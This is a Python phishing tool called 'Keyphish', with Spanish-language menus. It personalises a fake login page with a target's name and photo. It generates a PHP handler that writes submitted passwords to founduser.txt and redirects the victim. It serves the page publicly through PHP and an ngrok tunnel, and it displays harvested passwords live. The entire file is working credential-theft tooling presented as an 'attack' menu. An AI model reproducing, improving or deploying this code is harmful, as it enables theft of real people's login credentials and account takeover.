#-*-coding: utf-8 -*-


## Módulos a importar
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def logo():
    print('      ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗')
    print('      ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗██║░░██║██║██╔════╝██║░░██║')
    print('      █████═╝░█████╗░░░╚████╔╝░██████╔╝███████║██║╚█████╗░███████║')
    print('      ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║')
    print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
    print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
    print('                                              By BR4CKSTAR')

def usuarionombre():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese el nombre de usuario: \n     1- Atrás\nKeyphish:~$ ')

    lineas[79] = '            <p class="name">Continuar como ' + name + ' <br><a href="index.html" style="font-size: 11px;">¿No eres tú?</a></p>\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")

def fotoperfil():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()

    name = input('Ingrese link o ruta de la imagen. \n     1- Atrás\nKeyphish:~$ ')

    lineas[77] = '            <img class="imgp" src="' + name + '">\n'

    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")

def contra():
    archivo = open('founduser.txt','w')
    archivo.close()
    while True:
        time.sleep(2)
        clearConsole()
        logo()
        archiv= open('founduser.txt')
        print('Contraseñas:                Ctrl+c para salir')
        print(archiv.read())

def link():
    escribir= open('login.php', 'w')

    y=input('Inserte un link para redireccionar.\n     1- Atrás\nKeyphish:~$ ')

    r=('''<?php\n$user = $_POST["email"];
    $co = "===========================================\n"; 
    $cl = "===========================================\n";
    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
    $us = "Password: $user\n";
    fwrite($fileuser, "\n". $co. $us. $cl);
    fclose($fileuser);
    header('Location: {'''+y+'''}');
    exit();
    ?>
    ''')

    escribir.write(r)
    if y==1:
        clearConsole()
        os.system("python Keyphish.py")
    clearConsole()
    os.system("python Keyphish.py")


def ngrok():
    os.system("gnome-terminal -- php -S localhost:8080")
    os.system("gnome-terminal -- ngrok http 8080")
    clearConsole()
    contra()
    print("Las contraseñas estaran almacenadas en founduser.txt")

def dependencias():
    os.system("sudo apt install gnome-terminal php python3 python3-pip")
    clearConsole()
    os.system("""curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok""")
    clearConsole()
    print("         Instalación completa  ")
    time.sleep(3)
    clearConsole()
    os.system("python Keyphish.py")

logo()
y=int(input("""             Bienvenido desea:
1- Iniciar ataque
2- Ingresar nombre usuario
3- Ingresar imagen de perfil
4- Ingresar link a redireccionar
5- Salir
0- Instalar dependencias
Keyphish:~$  """))

if y==0:
    clearConsole()
    logo()
    dependencias()

if y==1:
    clearConsole()
    logo()
    ngrok()

elif y==2:
    clearConsole()
    logo()
    usuarionombre()
    clearConsole()

elif y==3:
    clearConsole()
    logo()
    fotoperfil()
    clearConsole()

elif y==4:
    clearConsole()
    logo()
    link()
    clearConsole()

elif y==5:
    print("  HASTA PRONTO!!")
    time.sleep(2)
    clearConsole()
